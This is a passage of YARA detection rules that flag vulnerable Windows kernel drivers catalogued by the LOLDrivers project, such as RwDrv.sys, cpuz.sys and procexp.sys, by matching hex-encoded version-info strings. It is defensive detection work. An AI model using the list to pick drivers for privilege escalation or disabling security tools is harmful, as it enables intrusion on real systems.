date = \"2024-08-07 17:08:31\"\n      score = 40\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $ = { 00460069006c0065004400650073006300720069007000740069006f006e[1-8]004e006f00760065006c006c0020005800540043004f004d0020005300650072007600690063006500730020004400720069007600650072 } \n      $ = { 0043006f006d00700061006e0079004e0061006d0065[1-8]004e006f00760065006c006c002c00200049006e0063002e } \n      $ = { 00460069006c006500560065007200730069006f006e[1-8]0033002e0031002e00310031002e0030 } \n      $ = { 00500072006f006400750063007400560065007200730069006f006e[1-8]0033002e0031002e00310031 } \n      $ = { 00500072006f0064007500630074004e0061006d0065[1-8]004e006f00760065006c006c002000580054006900650072 } \n      $ = { 004f0072006900670069006e0061006c00460069006c0065006e0061006d0065[1-8]006c00690062006e00690063006d002e007300790073 } \n      $ = { 004c006500670061006c0043006f0070007900720069006700680074[1-8]00280043002900200043006f007000790072006900670068007400200032003000300030002d0032003000310034002c0020004e006f00760065006c006c002c00200049006e0063002e00200041006c006c0020005200690067006800740073002000520065007300650072007600650064002e } \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 100KB and all of them\n}\n\nrule PUA_VULN_Driver_Innotekgmbh_Vboxguest_Virtualboxguestadditions_9833_RID410D : DEMO EXE FILE {\n   meta:\n      description = \"Detects vulnerable driver mentioned in LOLDrivers project using VersionInfo values from the PE header - vboxguest.sys\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/magicsword-io/LOLDrivers\"\n      date = \"2024-08-07 00:28:41\"\n      score = 40\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $ = { 00460069006c0065004400650073006300720069007000740069006f006e[1-8]005600690072007400750061006c0042006f00780020004700750065007300740020004400720069007600650072 } \n      $ = { 0043006f006d00700061006e0079004e0061006d0065[1-8]0069006e006e006f00740065006b00200047006d00620048 } \n      $ = { 00460069006c006500560065007200730069006f006e[1-8]0031002e0035002e0032 } \n      $ = { 00500072006f006400750063007400560065007200730069006f006e[1-8]0031002e0035002e0032 } \n      $ = { 0049006e007400650072006e0061006c004e0061006d0065[1-8]00760062006f007800670075006500730074 } \n      $ = { 00500072006f0064007500630074004e0061006d0065[1-8]005600690072007400750061006c0042006f00780020004700750065007300740020004100640064006900740069006f006e0073 } \n      $ = { 004f0072006900670069006e0061006c00460069006c0065006e0061006d0065[1-8]00760062006f007800670075006500730074002e007300790073 } \n      $ = { 004c006500670061006c0043006f0070007900720069006700680074[1-8]0043006f0070007900720069006700680074002000280043002900200032003000300034002d003200300030003700200069006e006e006f00740065006b00200047006d00620048 } \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 100KB and all of them\n}\n\nrule PUA_VULN_Driver_Rweverything_Rwdrvsys_Rwdrvdriver_45BA_RID3BF1 : DEMO EXE FILE {\n   meta:\n      description = \"Detects vulnerable driver mentioned in LOLDrivers project using VersionInfo values from the PE header - RwDrv.sys\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/magicsword-io/LOLDrivers\"\n      date = \"2024-08-07 20:50:41\"\n      score = 40\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $ = { 00460069006c0065004400650073006300720069007000740069006f006e[1-8]005200770044007200760020004400720069007600650072 } \n      $ = { 0043006f006d00700061006e0079004e0061006d0065[1-8]00520057002d00450076006500720079007400680069006e0067 } \n      $ = { 00460069006c006500560065007200730069006f006e[1-8]0031002e00300030002e00300030002e00300030003000300020006200750069006c0074002000620079003a002000570069006e00440044004b } \n      $ = { 00500072006f006400750063007400560065007200730069006f006e[1-8]0031002e00300030002e00300030002e0030003000300030 } \n      $ = { 0049006e007400650072006e0061006c004e0061006d0065[1-8]00520077004400720076002e007300790073 } \n      $ = { 00500072006f0064007500630074004e0061006d0065[1-8]005200770044007200760020004400720069007600650072 } \n      $ = { 004f0072006900670069006e0061006c00460069006c0065006e0061006d0065[1-8]00520077004400720076002e007300790073 } \n      $ = { 004c006500670061006c0043006f0070007900720069006700680074[1-8]0043006f0070007900720069006700680074002000280043002900200032003000310031002000520057002d00450076006500720079007400680069006e0067 } \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 100KB and all of them\n}\n\nrule PUA_VULN_Driver_Windowsrwinddkprovider_Vmdrvsys_Windowsrwinddkdriver_5C0B_RID43ED : DEMO EXE FILE {\n   meta:\n      description = \"Detects vulnerable driver mentioned in LOLDrivers project using VersionInfo values from the PE header - vmdrv.sys\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/magicsword-io/LOLDrivers\"\n      date = \"2024-08-07 02:31:21\"\n      score = 40\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $ = { 00460069006c0065004400650073006300720069007000740069006f006e[1-8]0056006f006900630065006d006f00640020005600690072007400750061006c00200041007500640069006f00200044006500760069006300650020002800570044004d0029 } \n      $ = { 0043006f006d00700061006e0079004e0061006d0065[1-8]00570069006e0064006f007700730020002800520029002000570069006e00200037002000440044004b002000700072006f00760069006400650072 } \n      $ = { 00460069006c006500560065007200730069006f006e[1-8]00310030002e0030002e00310030003000310031002e00310036003300380034 } \n      $ = { 00500072006f006400750063007400560065007200730069006f006e[1-8]00310030002e0030002e00310030003000310031002e00310036003300380034 } \n      $ = { 0049006e007400650072006e0061006c004e0061006d0065[1-8]0076006d006400720076002e007300790073 } \n      $ = { 00500072006f0064007500630074004e0061006d0065[1-8]00570069006e0064006f007700730020002800520029002000570069006e00200037002000440044004b0020006400720069007600650072 } \n      $ = { 004f0072006900670069006e0061006c00460069006c0065006e0061006d0065[1-8]0076006d006400720076002e007300790073 } \n      $ = { 004c006500670061006c0043006f0070007900720069006700680074[1-8]0043006f0070007900720069006700680074002000280043002900200056006f006900630065006d006f006400200053002e004c002e0032003000310030002d0032003000320030 } \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 100KB and all of them\n}\n\nrule PUA_VULN_Driver_Advancedmicrodevices_Amdryzenmasterdriversys_Amdryzenmasterservicedriver_A130_RID4BDE : DEMO EXE FILE {\n   meta:\n      description = \"Detects vulnerable driver mentioned in LOLDrivers project using VersionInfo values from the PE header - AMDRyzenMasterDriver.sys\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/magicsword-io/LOLDrivers\"\n      date = \"2024-08-07 08:10:11\"\n      score = 40\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $ = { 00460069006c0065004400650073006300720069007000740069006f006e[1-8]0041004d0044002000520079007a0065006e0020004d00610073007400650072002000530065007200760069006300650020004400720069007600650072 } \n      $ = { 0043006f006d00700061006e0079004e0061006d0065[1-8]0041006400760061006e0063006500640020004d006900630072006f00200044006500760069006300650073 } \n      $ = { 00460069006c006500560065007200730069006f006e[1-8]0031002e0033002e0030002e0030 } \n      $ = { 00500072006f006400750063007400560065007200730069006f006e[1-8]0031002e0033002e0030002e0030 } \n      $ = { 0049006e007400650072006e0061006c004e0061006d0065[1-8]0041004d004400520079007a0065006e004d00610073007400650072004400720069007600650072002e007300790073 } \n      $ = { 00500072006f0064007500630074004e0061006d0065[1-8]0041004d0044002000520079007a0065006e0020004d00610073007400650072002000530065007200760069006300650020004400720069007600650072 } \n      $ = { 004f0072006900670069006e0061006c00460069006c0065006e0061006d0065[1-8]0041004d004400520079007a0065006e004d00610073007400650072004400720069007600650072002e007300790073 } \n      $ = { 004c006500670061006c0043006f0070007900720069006700680074[1-8]0043006f0070007900720069006700680074002000a90020003200300031003800200041004d0044002c00200049006e0063002e } \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 100KB and all of them\n}\n\nrule PUA_VULN_Driver_Realixtm_Hwinfoisys_Hwinfoiakerneldriver_33C6_RID3E7C : DEMO EXE FILE {\n   meta:\n      description = \"Detects vulnerable driver mentioned in LOLDrivers project using VersionInfo values from the PE header - HWiNFO64I.SYS\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/magicsword-io/LOLDrivers\"\n      date = \"2024-08-07 22:39:11\"\n      score = 40\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $ = { 00460069006c0065004400650073006300720069007000740069006f006e[1-8]004800570069004e0046004f002000490041003600340020004b00650072006e0065006c0020004400720069007600650072 } \n      $ = { 0043006f006d00700061006e0079004e0061006d0065[1-8]005200450041004c0069005800280074006d0029 } \n      $ = { 00460069006c006500560065007200730069006f006e[1-8]0038002e00370032 } \n      $ = { 00500072006f006400750063007400560065007200730069006f006e[1-8]0038002e00370032 } \n      $ = { 0049006e007400650072006e0061006c004e0061006d0065[1-8]004800570069004e0046004f003600340049002e005300590053 } \n      $ = { 00500072006f0064007500630074004e0061006d0065[1-8]004800570069004e0046004f002000490041003600340020004b00650072006e0065006c0020004400720069007600650072 } \n      $ = { 004f0072006900670069006e0061006c00460069006c0065006e0061006d0065[1-8]004800570069004e0046004f003600340049002e005300590053 } \n      $ = { 004c006500670061006c0043006f0070007900720069006700680074[1-8]0043006f007000790072006900670068007400200028006300290031003900390039002d00320030003100320020004d0061007200740069006e0020004d0061006c00ed006b0020002d0020005200450041004c00690058 } \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 100KB and all of them\n}\n\nrule PUA_VULN_Driver_Advancedmicrodevicesinc_Pdfwkrnlsys_Usbcpowerdeliveryfirmwareupdateutilitydriver_6945_RID4F4C : DEMO EXE FILE {\n   meta:\n      description = \"Detects vulnerable driver mentioned in LOLDrivers project using VersionInfo values from the PE header - PDFWKRNL.sys\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/magicsword-io/LOLDrivers\"\n      date = \"2024-08-07 08:51:40\"\n      score = 40\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $ = { 00460069006c0065004400650073006300720069007000740069006f006e[1-8]005500530042002d004300200050006f007700650072002000440065006c006900760065007200790020004600690072006d007700610072006500200055007000640061007400650020005500740069006c0069007400790020004400720069007600650072 } \n      $ = { 0043006f006d00700061006e0079004e0061006d0065[1-8]0041006400760061006e0063006500640020004d006900630072006f00200044006500760069006300650073002c00200049006e0063002e } \n      $ = { 00460069006c006500560065007200730069006f006e[1-8]0031002e0030 } \n      $ = { 00500072006f006400750063007400560065007200730069006f006e[1-8]0031002e0030 } \n      $ = { 0049006e007400650072006e0061006c004e0061006d0065[1-8]0050004400460057004b0052004e004c002e007300790073 } \n      $ = { 00500072006f0064007500630074004e0061006d0065[1-8]005500530042002d004300200050006f007700650072002000440065006c006900760065007200790020004600690072006d007700610072006500200055007000640061007400650020005500740069006c0069007400790020004400720069007600650072 } \n      $ = { 004f0072006900670069006e0061006c00460069006c0065006e0061006d0065[1-8]0050004400460057004b0052004e004c002e007300790073 } \n      $ = { 004c006500670061006c0043006f0070007900720069006700680074[1-8]0043006f007000790072006900670068007400200028004300290020003200300032003100200041006400760061006e0063006500640020004d006900630072006f00200044006500760069006300650073002c00200049006e0063002e } \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 100KB and all of them\n}\n\nrule PUA_VULN_Driver_Fintekcorp_Fintekcorpfintekpcieuart_32BD_RID3C76 : DEMO EXE FILE {\n   meta:\n      description = \"Detects vulnerable driver mentioned in LOLDrivers project using VersionInfo values from the PE header - FPCIE2COM.sys\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/magicsword-io/LOLDrivers\"\n      date = \"2024-08-07 21:12:51\"\n      score = 40\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $ = { 00460069006c0065004400650073006300720069007000740069006f006e[1-8]00460069006e00740065006b002000500063006900650032005500610072007400200041006400610070007400650072 } \n      $ = { 0043006f006d00700061006e0079004e0061006d0065[1-8]00460069006e00740065006b00200043006f00720070002e } \n      $ = { 00460069006c006500560065007200730069006f006e[1-8]0031002c00200030002c00200030002c00200030 } \n      $ = { 00500072006f006400750063007400560065007200730069006f006e[1-8]0031002c00200030002c00200030002c00200030 } \n      $ = { 00500072006f0064007500630074004e0061006d0065[1-8]00460069006e00740065006b00200043006f00720070002e002000460069006e00740065006b0020005000630069006500320055006100720074 } \n      $ = { 004f0072006900670069006e0061006c00460069006c0065006e0061006d0065[1-8]0046005000430049004500320043004f004d002e007300790073 } \n      $ = { 004c006500670061006c0043006f0070007900720069006700680074[1-8]0043006f007000790072006900670068007400200040002000460069006e00740065006b00200043006f00720070002e00200032003000300032002d0032003000310033 } \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 100KB and all of them\n}\n\nrule PUA_VULN_Driver_Avastsoftware_Ngiodriversys_Avastng_42B3_RID3C73 : DEMO EXE FILE {\n   meta:\n      description = \"Detects vulnerable driver mentioned in LOLDrivers project using VersionInfo values from the PE header - ngiodriver.sys\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/magicsword-io/LOLDrivers\"\n      date = \"2024-08-07 21:12:21\"\n      score = 40\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $ = { 00460069006c0065004400650073006300720069007000740069006f006e[1-8]0061007600610073007400210020004e0047002000730065007400750070002000680065006c0070006500720020006400720069007600650072 } \n      $ = { 0043006f006d00700061006e0079004e0061006d0065[1-8]0041005600410053005400200053006f006600740077006100720065 } \n      $ = { 00460069006c006500560065007200730069006f006e[1-8]00310030002e0030002e0030002e003300320030 } \n      $ = { 00500072006f006400750063007400560065007200730069006f006e[1-8]00310030002e0030002e0030002e003300320030 } \n      $ = { 0049006e007400650072006e0061006c004e0061006d0065[1-8]006e00670069006f006400720069007600650072002e007300790073 } \n      $ = { 00500072006f0064007500630074004e0061006d0065[1-8]004100760061007300740020004e0047 } \n      $ = { 004f0072006900670069006e0061006c00460069006c0065006e0061006d0065[1-8]006e00670069006f006400720069007600650072002e007300790073 } \n      $ = { 004c006500670061006c0043006f0070007900720069006700680074[1-8]0043006f007000790072006900670068007400200028006300290020003200300031003400200041005600410053005400200053006f006600740077006100720065 } \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 100KB and all of them\n}\n\nrule PUA_VULN_Driver_Avgtechnologiesczsro_Aswarpot_Avginternetsecuritysystem_5BD4_RID4519 : DEMO EXE FILE {\n   meta:\n      description = \"Detects vulnerable driver mentioned in LOLDrivers project using VersionInfo values from the PE header - aswArPot.sys, avgArPot.sys\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/magicsword-io/LOLDrivers\"\n      date = \"2024-08-07 03:21:21\"\n      score = 40\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $ = { 00460069006c0065004400650073006300720069007000740069006f006e[1-8]00410056004700200041006e0074006900200052006f006f0074006b00690074 } \n      $ = { 0043006f006d00700061006e0079004e0061006d0065[1-8]00410056004700200054006500630068006e006f006c006f006700690065007300200043005a002c00200073002e0072002e006f002e } \n      $ = { 00460069006c006500560065007200730069006f006e[1-8]00320030002e0036002e003100300037002e0030 } \n      $ = { 00500072006f006400750063007400560065007200730069006f006e[1-8]00320030002e0036002e003100300037002e0030 } \n      $ = { 0049006e007400650072006e0061006c004e0061006d0065[1-8]006100730077004100720050006f0074 } \n      $ = { 00500072006f0064007500630074004e0061006d0065[1-8]00410056004700200049006e007400650072006e00650074002000530065006300750072006900740079002000530079007300740065006d0020 } \n      $ = { 004f0072006900670069006e0061006c00460069006c0065006e0061006d0065[1-8]006100730077004100720050006f0074002e007300790073 } \n      $ = { 004c006500670061006c0043006f0070007900720069006700680074[1-8]0043006f0070007900720069006700680074002000280043002900200032003000320030002000410056004700200054006500630068006e006f006c006f006700690065007300200043005a002c00200073002e0072002e006f002e } \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 300KB and all of them\n}\n\nrule PUA_VULN_Driver_Innotekgmbh_Vboxusbsys_Virtualboxusbdriver_C509_RID3F87 : DEMO EXE FILE {\n   meta:\n      description = \"Detects vulnerable driver mentioned in LOLDrivers project using VersionInfo values from the PE header - VBoxUSB.Sys\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/magicsword-io/LOLDrivers\"\n      date = \"2024-08-07 23:23:41\"\n      score = 40\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $ = { 00460069006c0065004400650073006300720069007000740069006f006e[1-8]005600690072007400750061006c0042006f007800200055005300420020006400720069007600650072 } \n      $ = { 0043006f006d00700061006e0079004e0061006d0065[1-8]0069006e006e006f00740065006b00200047006d00620048 } \n      $ = { 00460069006c006500560065007200730069006f006e[1-8]0031002e00300031 } \n      $ = { 00500072006f006400750063007400560065007200730069006f006e[1-8]0031002e00300031 } \n      $ = { 0049006e007400650072006e0061006c004e0061006d0065[1-8]00560042006f0078005500530042002e005300790073 } \n      $ = { 00500072006f0064007500630074004e0061006d0065[1-8]005600690072007400750061006c0042006f007800200055005300420020006400720069007600650072 } \n      $ = { 004f0072006900670069006e0061006c00460069006c0065006e0061006d0065[1-8]00560042006f0078005500530042002e005300790073 } \n      $ = { 004c006500670061006c0043006f0070007900720069006700680074[1-8]0069006e006e006f00740065006b00200047006d00620048 } \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 100KB and all of them\n}\n\nrule PUA_VULN_Driver_Netfiltersys_F171_RID330F : DEMO EXE FILE {\n   meta:\n      description = \"Detects vulnerable driver mentioned in LOLDrivers project using VersionInfo values from the PE header - netfilter2.sys\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/magicsword-io/LOLDrivers\"\n      date = \"2024-08-07 14:31:41\"\n      score = 40\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $ = { 00460069006c0065004400650073006300720069007000740069006f006e[1-8]00570059004a0053005100200057004600500020004400720069007600650072002000280057005000500029 } \n      $ = { 0043006f006d00700061006e0079004e0061006d0065[1-8]5b8f56fe65e05fe7 } \n      $ = { 00460069006c006500560065007200730069006f006e[1-8]0031002e0035002e0037002e0038 } \n      $ = { 00500072006f006400750063007400560065007200730069006f006e[1-8]0036002e0032002e0039003200300030002e00320030003500350037 } \n      $ = { 0049006e007400650072006e0061006c004e0061006d0065[1-8]006e0065007400660069006c0074006500720032002e007300790073 } \n      $ = { 00500072006f0064007500630074004e0061006d0065[1-8]65e05fe752a0901f5668 } \n      $ = { 004f0072006900670069006e0061006c00460069006c0065006e0061006d0065[1-8]006e0065007400660069006c0074006500720032002e007300790073 } \n      $ = { 004c006500670061006c0043006f0070007900720069006700680074[1-8]0043006f0070007900720069006700680074002000a9002000770079006a00730071002e0063006f006d } \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 100KB and all of them\n}\n\nrule PUA_VULN_Driver_Novellinc_Novellxtier_DD4F_RID36CB : DEMO EXE FILE {\n   meta:\n      description = \"Detects vulnerable driver mentioned in LOLDrivers project using VersionInfo values from the PE header - NICM.sys\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/magicsword-io/LOLDrivers\"\n      date = \"2024-08-07 17:11:01\"\n      score = 40\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $ = { 00460069006c0065004400650073006300720069007000740069006f006e[1-8]004e006f00760065006c006c00200043006c00690065006e007400200050006f00720074006100620069006c0069007400790020004c0061007900650072 } \n      $ = { 0043006f006d00700061006e0079004e0061006d0065[1-8]004e006f00760065006c006c002c00200049006e0063002e } \n      $ = { 00460069006c006500560065007200730069006f006e[1-8]0033002e0031002e0036002e0030 } \n      $ = { 00500072006f006400750063007400560065007200730069006f006e[1-8]0033002e0031002e0036 } \n      $ = { 00500072006f0064007500630074004e0061006d0065[1-8]004e006f00760065006c006c002000580054006900650072 } \n      $ = { 004f0072006900670069006e0061006c00460069006c0065006e0061006d0065[1-8]004e00490043004d002e005300590053 } \n      $ = { 004c006500670061006c0043006f0070007900720069006700680074[1-8]00280043002900200043006f007000790072006900670068007400200032003000300030002d0032003000300038002c0020004e006f00760065006c006c002c00200049006e0063002e00200041006c006c0020005200690067006800740073002000520065007300650072007600650064002e } \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 100KB and all of them\n}\n\nrule PUA_VULN_Driver_Novellinc_Novellxtier_7627_RID369F : DEMO EXE FILE {\n   meta:\n      description = \"Detects vulnerable driver mentioned in LOLDrivers project using VersionInfo values from the PE header - nicm.sys\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/magicsword-io/LOLDrivers\"\n      date = \"2024-08-07 17:03:41\"\n      score = 40\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $ = { 00460069006c0065004400650073006300720069007000740069006f006e[1-8]004e006f00760065006c006c00200043006c00690065006e007400200050006f00720074006100620069006c0069007400790020004c0061007900650072 } \n      $ = { 0043006f006d00700061006e0079004e0061006d0065[1-8]004e006f00760065006c006c002c00200049006e0063002e } \n      $ = { 00460069006c006500560065007200730069006f006e[1-8]0033002e0031002e00310030002e0030 } \n      $ = { 00500072006f006400750063007400560065007200730069006f006e[1-8]0033002e0031002e00310030 } \n      $ = { 00500072006f0064007500630074004e0061006d0065[1-8]004e006f00760065006c006c002000580054006900650072 } \n      $ = { 004f0072006900670069006e0061006c00460069006c0065006e0061006d0065[1-8]004e00490043004d002e005300590053 } \n      $ = { 004c006500670061006c0043006f0070007900720069006700680074[1-8]00280043002900200043006f007000790072006900670068007400200032003000300030002d0032003000310032002c0020004e006f00760065006c006c002c00200049006e0063002e00200041006c006c0020005200690067006800740073002000520065007300650072007600650064002e } \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 100KB and all of them\n}\n\nrule PUA_VULN_Driver_Nvidiacorp_Nvoclocksys_Nvidiasystemutilitydriver_16AE_RID421C : DEMO EXE FILE {\n   meta:\n      description = \"Detects vulnerable driver mentioned in LOLDrivers project using VersionInfo values from the PE header - nvoclock.sys\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/magicsword-io/LOLDrivers\"\n      date = \"2024-08-07 01:13:51\"\n      score = 40\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $ = { 00460069006c0065004400650073006300720069007000740069006f006e[1-8]004e00560069006400690061002000530079007300740065006d0020005500740069006c0069007400790020004400720069007600650072 } \n      $ = { 0043006f006d00700061006e0079004e0061006d0065[1-8]004e0056006900640069006100200043006f00720070002e } \n      $ = { 00460069006c006500560065007200730069006f006e[1-8]0036002e00300032002e00310035 } \n      $ = { 00500072006f006400750063007400560065007200730069006f006e[1-8]0036002e00300032002e00310035 } \n      $ = { 0049006e007400650072006e0061006c004e0061006d0065[1-8]006e0076006f0063006c006f0063006b002e007300790073 } \n      $ = { 00500072006f0064007500630074004e0061006d0065[1-8]004e00560069006400690061002000530079007300740065006d0020005500740069006c0069007400790020004400720069007600650072 } \n      $ = { 004f0072006900670069006e0061006c00460069006c0065006e0061006d0065[1-8]006e0076006f0063006c006f0063006b002e007300790073 } \n      $ = { 004c006500670061006c0043006f0070007900720069006700680074[1-8]0043006f0070007900720069006700680074002000a9004e0056004900440049004100200043006f00720070002e00200032003000300033002d0032003000300034 } \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 100KB and all of them\n}\n\nrule PUA_VULN_Driver_Computerz_Computerzsys_Computerzsystemdriver_61F3_RID40AD : DEMO EXE FILE {\n   meta:\n      description = \"Detects vulnerable driver mentioned in LOLDrivers project using VersionInfo values from the PE header - ComputerZ.Sys\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/magicsword-io/LOLDrivers\"\n      date = \"2024-08-07 00:12:41\"\n      score = 40\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $ = { 00460069006c0065004400650073006300720069007000740069006f006e[1-8]0043006f006d00700075007400650072005a002000530079007300740065006d0020004400720069007600650072 } \n      $ = { 0043006f006d00700061006e0079004e0061006d0065[1-8]0043006f006d00700075007400650072005a } \n      $ = { 00460069006c006500560065007200730069006f006e[1-8]0031002e0030002e0038002e003800310038 } \n      $ = { 00500072006f006400750063007400560065007200730069006f006e[1-8]0031002e0030002e0038002e003800310038 } \n      $ = { 0049006e007400650072006e0061006c004e0061006d0065[1-8]0043006f006d00700075007400650072005a002e005300790073 } \n      $ = { 00500072006f0064007500630074004e0061006d0065[1-8]0043006f006d00700075007400650072005a002000530079007300740065006d0020004400720069007600650072 } \n      $ = { 004f0072006900670069006e0061006c00460069006c0065006e0061006d0065[1-8]0043006f006d00700075007400650072005a002e005300790073 } \n      $ = { 004c006500670061006c0043006f0070007900720069006700680074[1-8]0043006f007000790072006900670068007400200028004300290020003200300030003800200043006f006d00700075007400650072005a } \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 100KB and all of them\n}\n\nrule PUA_VULN_Driver_Sysinternalswwwsysinternalscom_Procexpsys_Processexplorer_88E2_RID463B : DEMO EXE FILE {\n   meta:\n      description = \"Detects vulnerable driver mentioned in LOLDrivers project using VersionInfo values from the PE header - procexp.Sys\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/magicsword-io/LOLDrivers\"\n      date = \"2024-08-07 04:09:41\"\n      score = 40\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $ = { 00460069006c0065004400650073006300720069007000740069006f006e[1-8]00500072006f00630065007300730020004500780070006c006f007200650072 } \n      $ = { 0043006f006d00700061006e0079004e0061006d0065[1-8]0053007900730069006e007400650072006e0061006c00730020002d0020007700770077002e0073007900730069006e007400650072006e0061006c0073002e0063006f006d } \n      $ = { 00460069006c006500560065007200730069006f006e[1-8]00310035002e00300030 } \n      $ = { 00500072006f006400750063007400560065007200730069006f006e[1-8]00310035002e00300030 } \n      $ = { 0049006e007400650072006e0061006c004e0061006d0065[1-8]00700072006f0063006500780070002e007300790073 } \n      $ = { 00500072006f0064007500630074004e0061006d0065[1-8]00500072006f00630065007300730020004500780070006c006f007200650072 } \n      $ = { 004f0072006900670069006e0061006c00460069006c0065006e0061006d0065[1-8]00700072006f0063006500780070002e005300790073 } \n      $ = { 004c006500670061006c0043006f0070007900720069006700680074[1-8]0043006f007000790072006900670068007400200028004300290020004d00610072006b002000520075007300730069006e006f007600690063006800200031003900390036002d0032003000310034 } \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 100KB and all of them\n}\n\nrule PUA_VULN_Driver_Windowsrwinddkprovider_Cpuzsys_Windowsrwinddkdriver_1F4D_RID4385 : DEMO EXE FILE {\n   meta:\n      description = \"Detects vulnerable driver mentioned in LOLDrivers project using VersionInfo values from the PE header - cpuz.sys\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/magicsword-io/LOLDrivers\"\n      date = \"2024-08-07 02:14:01\"\n      score = 40\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $ = { 00460069006c0065004400650073006300720069007000740069006f006e[1-8]004300500055004900440020004400720069007600650072 } \n      $ = { 0043006f006d00700061006e0079004e0061006d0065[1-8]00570069006e0064006f007700730020002800520029002000570069006e00200037002000440044004b002000700072006f00760069006400650072 } \n      $ = { 00460069006c006500560065007200730069006f006e[1-8]0036002e0031002e0037003600300030002e003100360033003800350020006200750069006c0074002000620079003a002000570069006e00440044004b } \n      $ = { 00500072006f006400750063007400560065007200730069006f006e[1-8]0036002e0031002e0037003600300030002e00310036003300380035 } \n      $ = { 0049006e007400650072006e0061006c004e0061006d0065[1-8]006300700075007a002e007300790073 } \n      $ = { 